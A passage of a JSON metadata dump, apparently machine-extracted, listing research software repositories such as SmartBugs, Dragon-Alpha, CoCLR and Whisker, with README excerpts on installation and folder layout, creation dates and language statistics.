|                    |\n| [teEther](https://github.com/nescio007/teether)      | #04adf56 |                    |                    | :heavy_check_mark: |\n| [Vandal](https://github.com/usyd-blockchain/vandal)  | #d2b0043 |                    |                    | :heavy_check_mark: | \n",
                    "original_header": "Supported Tools"
                },
                "confidence": 0.9992017594245928,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- 143 contracts: [SB\n  Curated](https://github.com/smartbugs/smartbugs-curated) is a\n  curated dataset of vulnerable Solidity smart contracts. \n",
                    "original_header": "Smart Contract Data for Analysis"
                },
                "confidence": 0.9833782482547083,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-05-14T13:56:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T06:37:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 190142
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16759
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Nix",
                    "name": "Nix",
                    "type": "Programming_language",
                    "size": 14988
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 6367
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "354": {
        "filename": "GilgameshXYZ123_Dragon-Alpha_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/GilgameshXYZ123/Dragon-Alpha-v1.0",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**1.** cu32 now is only complied for 64-bit Windows, so kindly run Alpha\u2019s apps on such OS.<br>\n**2.** Please make sure: the JDK version is greater than 8.0<br>\n**3.** Please make sure: compute >= 61, sm >= 61<br>\n**4.** Kindly read \u201cArxiv.pdf\u201d first, to briefly understand Alpha.<br>\n**5.** Alpha has only been executed on GTX 1050, RTX 3060ti GPU, and presently its applications can only be executed on CUDA GPU.<br>\n**6.** Since I am the only-one programmer to build Alpha, I must pay my main attention to the code instead of the document, to complete Alpha\u2019s prototype in time. If you have some questions, just see the source-code. Sorry, my personal abilities are really limited.<br>  \n",
                    "original_header": "I.Pay-Attention"
                },
                "confidence": 0.9999897231908214,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/GilgameshXYZ123/Dragon-Alpha/v1.0/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- **Arxiv.pdf**  an article talking about the background, characteristics, architecture and experiments of Alpha, preprinted on arxiv.org, at: https://arxiv.org/abs/2305.08819.<br>\n- **exec**  the executable files of Alpha.\n  - **lib**  Java libraries of Alpha, which are jar-files complied by Java-code. Obviously, you need to add such jar files to your projects.<br>\n  - **native-lib**  native libraries of Dragon-Alpha. They are dynamic-linked-libraries, and integrated to Alpha at the bottom through JNI.<br>\n    - **cuda_float32**  contains the executable files of cu32. Presently, cu32 has only been complied for 64-bit Windows, and will be compiled for Linux in the near future<br>\n  - **icon**  Alpha\u2019s logo. If you like it, set it for Alpha\u2019s home directory. <br> \n  - **data**  Alphas\u2019 built-in data-sets, including MINIST, cifar-10, cifar-100 and Soccer. Please decompress before use them.<br> \n  - **src**  the source-code of Dragon-Alpha<br>\n  - **alpha_src**  the Java source-code of Alpha. You rename this directory to \u2018src\u2019 and integrate it to your own Java-project. I suggest using NetBeans to read such source-code, since I use NetBeans to build Alpha.<br>\n  - **zutil_src**  ZUtil is an auxiliary library for Alpha. Since I wrote it in my sophomore year, it may have some unreasonable aspects in programming-style and architecture. I only uploaded a part of it, so kindly use ZUTIL-STD-1.1.jar instead of the source-code.<br>\n  - **cu32_src**  the C++ source-code of cu32, consists of 13 Visual Studio (VS2017) projects. To open such projects on your PC, please make sure your VS can build CUDA projects. You also need to add jdk.include&jdk.lib to such projects (such as jni.h, jvm.lib). Since I use CUDA v11.3, I suggest you to use such version too.<br>\n- **experiments**  the related experimental code&data related to Arxiv.pdf.<br>\n  - **alpha-code**  the experimental code of Alpha, you can take it as examples, to create your own Alpha-app. Before using Alpha\u2019s API, you must specify the home-path of Alpha, in order to load the relative native libraries.<br>\n  ![image](https://github.com/GilgameshXYZ123/Dragon-Alpha/assets/65615049/2586a7d0-0226-4bae-a575-5d9e2c8bdf66)\n  - **pytorch-code**  the experimental code of PyTorch.<br>\n  - **experiment-data**  console output to track some metrics for both Alpha and PyTorch, in order to make a comparison.<br>\n  - **test_cuda**  some related code to test Alpha&cu32. You can take it as examples of using Alpha\u2019s operators.<br> \n",
                    "original_header": "II. Files"
                },
                "confidence": 0.999550396165609,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/GilgameshXYZ123/Dragon-Alpha/v1.0/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-15T05:24:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-11T07:53:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 7829009
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3304388
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 34394
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PowerShell",
                    "name": "PowerShell",
                    "type": "Programming_language",
                    "size": 8834
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 4644
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 1339
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "355": {
        "filename": "serval-snt-uni-lu_RePack_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/serval-snt-uni-lu/RePack",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-08-31T08:07:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-12T19:24:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 13944
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 388
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "356": {
        "filename": "tianzhaotju_CODA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tianzhaotju/CODA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\r\n.\r\n\u2502  README.md\r\n\u2502  utils.py\r\n\u2502  \r\n\u251c\u2500test\r\n\u2502  \u251c\u2500AuthorshipAttribution\r\n\u2502  \u2502  \u2502  README.md\r\n\u2502  \u2502  \u251c\u2500code\r\n\u2502  \u2502  \u2514\u2500dataset\r\n\u2502  \u2502          \r\n\u2502  \u251c\u2500CloneDetection\r\n\u2502  \u2502  \u2502  README.md\r\n\u2502  \u2502  \u251c\u2500code  \r\n\u2502  \u2502  \u2514\u2500dataset\r\n\u2502  \u2502          \r\n\u2502  \u251c\u2500DefectPrediction\r\n\u2502  \u2502  \u2502  README.md\r\n\u2502  \u2502  \u251c\u2500code\r\n\u2502  \u2502  \u2514\u2500dataset\r\n\u2502  \u2502          \r\n\u2502  \u251c\u2500FunctionalityClassification\r\n\u2502  \u2502  \u2502  README.md\r\n\u2502  \u2502  \u251c\u2500code\r\n\u2502  \u2502  \u2514\u2500dataset\r\n\u2502  \u2502          \r\n\u2502  \u2514\u2500VulnerabilityPrediction\r\n\u2502      \u2502  README.md\r\n\u2502      \u251c\u2500code\r\n\u2502      \u2514\u2500dataset       \r\n\u251c\u2500figs \r\n\u2514\u2500python_parser\r\n    \u2502  pattern.py\r\n    \u2502  run_parser.py\r\n    \u2514\u2500parser_folder\r\n        \u251c\u2500tree-sitter-c          \r\n        \u251c\u2500tree-sitter-cpp       \r\n        \u251c\u2500tree-sitter-java         \r\n        \u2514\u2500tree-sitter-python\r\n```\r\nUnder each subject's folder in `test/` (`AuthorshipAttribution/`, `CloneDetection/`, `DefectPrediction/`, `FunctionalityClassification/`, and `VulnerabilityPrediction/`), there are two folders (`code/` and `dataset/`) and one file (`README.md`). The original dataset and data processing programs (`get_reference.py`) are stored in the `dataset/` directory. The `code/` directory contains the test codes (`test.py` and `attacker.py`). The `README.md` file contains commands for data processing and testing. \r\nIn the `python_parser/` directory, there is tree-sitter, a parse tree generation tool. And we use this tool to implement parsing tools in multiple programming languages (`C/C++`, `Java`, and `Python`).\r\n\r\n--- --- ---\r\n\r \n",
                    "original_header": "Folder Structure"
                },
                "confidence": 0.9967641611482458,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tianzhaotju/CODA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-15T02:41:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T11:56:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 441604
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 106603
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 12341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scheme",
                    "name": "Scheme",
                    "type": "Programming_language",
                    "size": 7015
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 4184
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3969
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 634
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "357": {
        "filename": "ExpertiseModel_EmbeddingVectors_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ExpertiseModel/EmbeddingVectors",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-07-30T19:00:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-18T14:25:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 545551
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "358": {
        "filename": "prmr_DScribe-Research_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/prmr/DScribe-Research",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-14T18:40:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-12T13:41:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 78253725
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "359": {
        "filename": "2022CIRCLE_CIRCLE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/2022CIRCLE/CIRCLE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-14T02:37:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-22T08:42:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "360": {
        "filename": "eduardenoiu_NALABS_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/eduardenoiu/NALABS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "More details about NALABS can be found in  http://www.diva-portal.org/smash/record.jsf?pid=diva2%3A1332337&dswid=9711 \n\nNALABS is composed of two main components: the GUI as the main program executable and the metrics used as proxy for bad smells. \n\nThe latest release of the NALABS executable can be downloaded from GitHub on the releases page. Alternatively, it can be built from source code. You can use different methods to build an application: the Visual Studio IDE and the MSBuild command-line tools. \n\nAdd the package Microsoft.Office.Interop.Excel using the NuGet Package Manager. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "NALABS C# version - Documentation, Download and Install -",
                    "parent_header": [
                        "Summary of Measures Used in NALABS C# version"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/eduardenoiu/NALABS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-10T19:03:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-24T16:29:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 76451
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 15607
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "361": {
        "filename": "castor-software_oss-graph-metrics_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/castor-software/oss-graph-metrics",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-03-11T05:49:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-11T23:48:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 14992471
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7005630
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vue",
                    "name": "Vue",
                    "type": "Programming_language",
                    "size": 8019
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5095
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 243
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "362": {
        "filename": "ahealy19_F-IDE-2016_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ahealy19/F-IDE-2016",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-08-22T10:15:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-01-23T04:03:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1358065
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 636338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 142584
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "363": {
        "filename": "Jun-jie-Huang_CoCLR_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Jun-jie-Huang/CoCLR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nTo evaluate on CodeXGLUE WebQueryTest, you can first download the test file from [CodeXGLUE](https://github.com/microsoft/CodeXGLUE) and move the file to `data` directory with the following commands.\r\n\r\n```\r\ngit clone https://github.com/microsoft/CodeXGLUE\r\ncp CodeXGLUE/Text-Code/NL-code-search-WebQuery/data/test_webquery.json ./data/qa/\r\n```\r\n\r\nThen you can evaluate you model and submit the `--test_predictions_output` to CodeXGLUE challenge for the results on the test set.\r\n\r\nYou can submit the `--test_predictions_output` to CodeXGLUE challenge for the results on the test set.\r\nBASH2*\r\n\r \n",
                    "original_header": "Step 3: evaluate on CodeXGLUE - code search (WebQueryTest)"
                },
                "confidence": 0.999999841791306,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nTo apply CoCLR on the task of code question answering, you can run the commands with the following steps.\r\n\r\n#### Step 1: download the checkpoint trained on CodeSearchNet\r\n\r\nPlease to the first point in [Model Checkpoint section](#model-checkpoint)\r\n\r \n",
                    "original_header": "CoCLR on Code Question Answering"
                },
                "confidence": 0.9980265431893839,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n```\r\ncd data\r\npython augment_qra.py --task qa --qra_mode delete\r\npython augment_qra.py --task qa --qra_mode copy\r\npython augment_qra.py --task qa --qra_mode switch\r\ncd ../\r\n```\r\n\r \n",
                    "original_header": "Step 2: create query-rewritten data"
                },
                "confidence": 0.9999680844762308,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nTo train a search model without CoCLR, you can use the following command:\r\n\r\n```\r\nmodel=./model/search_codebert\r\nCUDA_VISIBLE_DEVICES=\"0\" python ./code_search/run_siamese_test.py \\\r\n\t\t--model_type roberta \\\r\n\t\t--do_train \\\r\n\t\t--do_eval \\\r\n\t\t--eval_all_checkpoints \\\r\n        --data_dir ./data/search/ \\\r\n\t\t--train_data_file cosqa-retrieval-train-19604.json \\\r\n\t\t--eval_data_file cosqa-retrieval-dev-500.json \\\r\n\t\t--retrieval_code_base code_idx_map.txt \\\r\n\t\t--code_type code \\\r\n\t\t--max_seq_length 200 \\\r\n\t\t--per_gpu_train_batch_size 32 \\\r\n\t\t--per_gpu_retrieval_batch_size 67 \\\r\n\t\t--learning_rate 1e-6 \\\r\n\t\t--num_train_epochs 10 \\\r\n\t\t--gradient_accumulation_steps 1 \\\r\n\t\t--evaluate_during_training \\\r\n\t\t--checkpoint_path ./model/codesearchnet-checkpoint \\\r\n        --output_dir ${model} \\\r\n        --encoder_name_or_path microsoft/codebert-base \\\r\n        2>&1 | tee ./search-train-codebert.log\r\n\r\n```\r\n\r\nYou can evaluate the model on the test set with the following command:\r\n\r\nBASH2*\r\n\r \n",
                    "original_header": "Step 2: training and evaluating"
                },
                "confidence": 0.9013025463526841,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nTo apply CoCLR on the task of code search, you can run the commands with the following steps.\r\n\r\n#### Step 1: download the checkpoint trained on CodeSearchNet\r\n\r\nPlease to the first point in [Model Checkpoint section](#model-checkpoint)\r\n\r\n#### Step 2: create query-rewritten data\r\n\r\n```\r\ncd data\r\npython augment_qra.py --task retrieval --qra_mode delete\r\npython augment_qra.py --task retrieval --qra_mode copy\r\npython augment_qra.py --task retrieval --qra_mode switch\r\ncd ../\r\n```\r\n\r \n",
                    "original_header": "CoCLR on Code Search"
                },
                "confidence": 0.9999992556901062,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nTo see the effects of different component of code in code search, we provide to run the ablation study. You can first create the test set of codes that some parts are removed, and then evaluate on these dataset with the following commands. You can select `--mode` with `header_only`, `doc_only`, `body_only`, `no_header`, `no_doc`, `no_body`.\r\n\r\n```\r\ncd data/search\r\npython split_code_for_retrieval.py\r\nmode=no_doc\r\nCUDA_VISIBLE_DEVICES=\"0\" python ./code_search/run_siamese_test.py \\\r\n\t\t--model_type roberta \\\r\n\t\t--do_retrieval \\\r\n\t\t--data_dir ./data/search/ablation_test_code_component/${mode} \\\r\n\t\t--test_data_file cosqa-retrieval-test-500.json \\\r\n\t\t--retrieval_code_base code_idx_map.txt \\\r\n\t\t--code_type code \\\r\n\t\t--max_seq_length 200 \\\r\n\t\t--per_gpu_retrieval_batch_size 67 \\\r\n\t\t--output_dir ${model}/checkpoint-best-mrr/ \\\r\n\t\t--encoder_name_or_path microsoft/codebert-base \\\r\n\t\t--pred_model_dir ${model}/checkpoint-best-mrr \\\r\n\t\t--retrieval_predictions_output ${model}/retrieval_outputs.txt \\\r\n\t\t2>&1 | tee ./search-test-ablation-codebert-coclr-${qra}-${mode}.log\r\n```\r\n\r \n",
                    "original_header": "Ablation with Model Component"
                },
                "confidence": 0.9906518343328605,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\n1. The checkpoint trained on CodeSearchNet can be downloaded through [this link](https://drive.google.com/drive/folders/1rM5A6dPf05Q5mP9kWjfsdRIpsqfI4IBi?usp=sharing). You can first download the checkpoint. Then move it to `./model/` and rename the dirname to `codesearchnet-checkpoint`. You can also use the data in [CodeXGLUE code search (WebQueryTest)](https://github.com/microsoft/CodeXGLUE/tree/main/Text-Code/NL-code-search-WebQuery/data) to train the models by your self.\r\n\r\n2. The checkpoint with best code question answering results can be downloaded through [this link](https://drive.google.com/drive/folders/1VjZOEI_N25R_30ZL2hYNaY-43FfpQ_MD?usp=sharing) and move to `./model/`.\r\n\r\n3. The checkpoint with best code search results can be downloaded through [this link](https://drive.google.com/drive/folders/1rmyqG68nmnjSFg4t8ywaSwJBCluKE4l2?usp=sharing) and move to `./model/`.\r\n\r \n",
                    "original_header": "Model Checkpoint"
                },
                "confidence": 0.9084063633832858,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Jun-jie-Huang/CoCLR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-24T06:52:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T16:12:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 104344
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "364": {
        "filename": "DSAatUSU_ChatGPT-promises-and-pitfalls_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/DSAatUSU/ChatGPT-promises-and-pitfalls",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-11-03T20:04:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-07T17:03:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 21861438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 270225
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "365": {
        "filename": "se2p_whisker-main_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/whisker",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Whisker requires Node.js v18.18.0 and is built using the [yarn](https://classic.yarnpkg.com/lang/en/) (classic) package manager. \nAfter cloning the repository, install all dependencies using:\n```bash\nyarn install\n```\n \nNow you can build the application using:\n```bash\nyarn build\n```\n \n",
                    "original_header": "Building Whisker"
                },
                "confidence": 0.9995904037989227,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/whisker-main/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Alternatively, you can build and run Whisker in headless mode using docker. This can be beneficial if you want to\nconduct large-scale experiments on a computing cluster. To this, create a Docker image for Whisker, for example using\nthe command\n```bash\ndocker build -t whisker .\n```\nNow, you can run the dockerized version of Whisker via\nBASH2*\nThe main entry point to the container is the wrapper script `whisker-docker.sh`, which calls Whisker's servant in\nheadless mode (using the flags `-d`, `-k` and `-l`, among others.) Any `<additional arguments>` given by the user will\nbe forwarded by the script to the servant. \nIn case you want to copy the artefacts created by Whisker (including redirection of stdout and stderr) to files in a\nwritable bind mount, you can achieve this for example as follows:\n```bash\ndocker run -v \"/on/the/host:/inside/the/container\" whisker /inside/the/container -- <Whikser arguments>\n```\nThis will mount the directory `/on/the/host` as `/inside/the/container`, instruct Whisker to copy its output (such as\ngenerated test files and log messages) to files in `/inside/the/container`, and make them accessible to you in the\ndirectory `/on/the/host`.\n \n",
                    "original_header": "Using Docker (Headless Mode)"
                },
                "confidence": 0.9947230544509869,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/whisker-main/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-09-24T15:20:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-17T04:19:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 1526083
                },
